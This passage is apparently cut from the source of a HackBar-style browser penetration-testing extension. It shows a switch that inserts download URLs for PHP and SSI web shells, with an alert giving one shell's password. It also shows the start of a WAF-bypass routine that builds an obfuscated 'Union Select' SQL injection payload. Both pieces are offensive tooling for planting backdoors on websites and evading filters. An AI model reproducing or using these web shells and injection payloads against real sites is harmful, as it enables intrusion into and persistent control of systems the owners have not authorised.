                    "https://raw.githubusercontent.com/Anon-Exploiter/An0n-3xPloiTeR-Shell/master/ssi.shtml";
                break;
            case "An0n-3xPloiTeR-Shell":
                alert("pass = uexploit");
                txt =
                    "https://raw.githubusercontent.com/Anon-Exploiter/An0n-3xPloiTeR-Shell/master/Shell.php";
                break;
            case "An0n-3xPloiTeR-mini-Shell":
                txt =
                    "https://raw.githubusercontent.com/Anon-Exploiter/Mini-Shell/master/mini_shell.php";
                break;
        }
        hackBar.setSelectedText(txt);
    },
    ...
    CalcWaf: function (choice) {
        ...
        switch (str) {
            ...
            case "OverFlow":
                var number = prompt(
                    "Amount of number to use in the /*!100000Union Select*/ Statement",
                    "100000"
                );
